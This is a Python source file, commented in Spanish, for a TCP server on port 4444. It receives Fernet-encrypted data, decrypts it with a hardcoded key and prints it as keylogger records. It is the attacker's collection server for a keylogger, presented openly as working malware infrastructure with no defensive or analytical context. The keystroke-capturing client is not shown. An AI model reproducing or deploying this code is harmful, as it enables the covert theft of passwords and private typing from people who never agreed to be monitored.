import socket
from cryptography.fernet import Fernet

class Server:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.cipher = Fernet(self.key)

    def decrypt(self, encrypted_data):
        try:
            return self.cipher.decrypt(encrypted_data).decode()
        except Exception as e:
            print(f"[ERROR] No se pudo descifrar los datos: {e}")
            return None

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.port))
            server_socket.listen(1)
            print(f"[INFO] Servidor escuchando en {self.host}:{self.port}")

            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    with client_socket:
                        print(f"[INFO] Conexión establecida con {client_address}")
                        while True:
                            encrypted_data = client_socket.recv(1024)
                            if not encrypted_data:
                                break
                            print("[INFO] Datos recibidos, descifrando...")
                            decrypted_data = self.decrypt(encrypted_data)
                            if decrypted_data:
                                print(f"[INFO] Registro del keylogger: {decrypted_data}")
                            else:
                                print("[ERROR] Error al descifrar los datos.")
                except Exception as e:
                    print(f"[ERROR] Error en la conexión con el cliente: {e}")


SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444

KEY = b'y8N2f_PGbyUXdfkmYp0x3eAaKAtMXE8IYljxqN9TTfI='

server = Server(SERVER_IP, SERVER_PORT, KEY)
server.start()
